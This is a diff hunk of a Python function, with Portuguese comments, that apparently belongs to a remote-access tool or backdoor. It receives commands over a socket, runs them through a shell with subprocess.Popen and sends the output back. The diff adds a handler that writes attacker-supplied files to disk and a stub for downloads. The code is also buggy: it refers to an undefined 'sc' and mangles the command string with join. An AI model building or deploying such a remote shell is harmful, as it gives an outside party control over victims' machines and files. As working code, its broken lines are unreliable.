@@ -44,12 +44,20 @@ def executa(socket):
             else:
                 try:
                     if(dados=='upload'): # upload
+                        nome_arquivo = socket.recv(1024)
+                        f = open(nome_arquivo,'wb')
+                        l = socket.recv(1024)
+                        while (l):
+                            f.write(l)
+                            l = sc.recv(1024)
 
                     elif(dados=='shell'): # shell
                         dados = ' '.join(dados)
                         comando = subprocess.Popen(dados, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)    # CRIAR THREADS PARA RODAR PROGRAMAS -> NÃO TER QUE ESPERAR O PROGRAMA FECHAR
                         retorno = comando.stdout.read() + comando.stderr.read()
                         socket.send(retorno)
+                    elif(dados=='download'):
+                        pass
                 except:
                     return
         except: # algum erro ocorreu, recomeça
